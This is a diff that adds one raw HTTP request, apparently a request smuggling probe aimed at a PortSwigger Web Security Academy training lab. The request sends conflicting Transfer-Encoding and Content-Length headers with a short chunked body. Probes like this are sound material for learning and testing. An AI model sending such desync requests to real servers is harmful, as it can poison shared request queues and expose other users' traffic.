@@ -1,0 +1,12 @@
+POST /post?cb=5070267384770882 HTTP/1.1
+Transfer-Encoding:chunked
+Host: ac8d1f141f42b4d8808d6af700690058.web-security-academy.net
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.87 Safari/537.36
+Content-type: application/x-www-form-urlencoded; charset=UTF-8
+Content-Length: 4
+Cookie:  session=lciaqa184vb3rydzqsbhzjfdhpojyen8;
+
+1
+Z
+0
+
